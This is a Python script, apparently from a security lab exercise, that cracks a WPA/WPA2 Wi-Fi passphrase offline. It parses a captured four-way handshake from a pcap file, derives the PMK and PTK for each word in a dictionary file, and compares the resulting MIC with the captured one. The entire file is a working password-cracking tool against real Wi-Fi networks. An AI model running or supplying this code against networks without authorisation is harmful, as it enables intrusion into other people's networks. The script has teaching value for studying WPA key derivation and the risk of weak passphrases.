#!/usr/bin/python3

import hmac, hashlib
from scapy_eapol import * 
from pbkdf2 import PBKDF2
from scapy.all import *
from tqdm import tqdm

def strtoint(chaine):
    return int(chaine.encode('utf8').hex(),16)

def psuedo_random_function_512(key, a, data):
    result = b''
    counter = 0
    while(len(result) < 64):
        concatenation = a + b'\x00' + data + bytes([counter])
        hash = hmac.new(key, digestmod=hashlib.sha1)
        hash.update(concatenation)
        hash = hash.digest()
        result += hash
        counter += 1
    return result[:64]

def pairwise_transient_key_gen(pairwise_master_key, mac_station, mac_access_point, nonce_station, nonce_access_point): 
    lower_mac, higher_mac = (mac_access_point, mac_station) if strtoint(mac_station)  > strtoint(mac_access_point) else (mac_station, mac_access_point)
    lower_nonce, higher_nonce = (nonce_access_point, nonce_station) if strtoint(nonce_station) > strtoint(nonce_access_point) else (nonce_station, nonce_access_point)
    data = lower_mac + higher_mac + lower_nonce + higher_nonce
    return psuedo_random_function_512(pairwise_master_key, b'Pairwise key expansion', bytes.fromhex(data))

if __name__ == "__main__":

    bind_layers(EAPOL, WPA_key, type=3)
    packets = rdpcap("capture_wpa.pcap")
    
    # extract the 4th packet from wpa handshake
    eapol =  EAPOL(bytes(packets[4][EAPOL]))
    eapol.key_ACK= 0
    eapol.wpa_key_mic= ''

    # extract the parameters
    ssid = packets[0].info
    mac_station = packets[2].addr2.replace(":", "")
    mac_access_point = packets[3].addr2.replace(":", "")
    nonce_access_point=packets[3].nonce.hex()
    nonce_station=packets[2].nonce.hex() 
    mic=packets[4][EAPOL].wpa_key_mic
    version = packets[1].key_descriptor_Version
    
    is_password_found = False
    
    # extract the number of lines for tqdm
    num_lines = sum(1 for line in open('dictionary.txt','r'))
    
    with open('dictionary.txt', 'r') as f:
        # Use tqdm to iterate over lines in the file
        for line in tqdm(f, total=num_lines, leave=False):
            passphrase= line[:-1]
            
            # get keys from current password
            pairwise_master_key = PBKDF2(passphrase, ssid, 4096).read(32) 
            pairwise_transient_key = pairwise_transient_key_gen(pairwise_master_key, mac_station, mac_access_point, nonce_station, nonce_access_point)
            key_confirmation_key = pairwise_transient_key[:16]
            
            if version == 2 :
                current_mic = hmac.new(key_confirmation_key, bytes(eapol), digestmod=hashlib.sha1).digest()
            else :
                current_mic = hmac.new(key_confirmation_key, bytes(eapol), digestmod=hashlib.md5).digest()
            
            if (current_mic == mic):
                print(f"\033[32mCongratulations ! Password found in dictionary: {passphrase}\033[0m")
                is_password_found = True
                break
        f.close()

    if not is_password_found:
        print("\033[31mPassword not found in dictionary :\\\033[0m")